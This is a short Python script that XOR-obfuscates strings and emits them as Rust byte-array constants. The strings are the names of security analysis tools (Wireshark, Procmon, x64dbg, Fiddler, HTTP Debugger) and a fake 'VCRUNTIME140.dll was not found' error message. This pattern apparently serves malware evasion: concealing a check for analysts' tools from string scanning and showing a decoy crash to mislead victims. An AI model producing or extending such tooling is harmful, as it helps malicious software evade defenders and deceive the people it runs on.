
def xor_string(s, key=0x55):
    encoded = [b ^ key for b in s.encode('utf-8')]
    return f"&{encoded}"

targets = ["wireshark", "procmon", "x64dbg", "fiddler", "httpdebugger", "Error: The code execution cannot proceed because VCRUNTIME140.dll was not found."]

print("// Generated Obfuscated Strings (Key 0x55)")
for t in targets:
    print(f"// {t}")
    print(f"const {t.split(':')[0].upper().replace(' ', '_').replace('.', '_').replace('-', '_')}_BYTES: &[u8] = {xor_string(t)};")
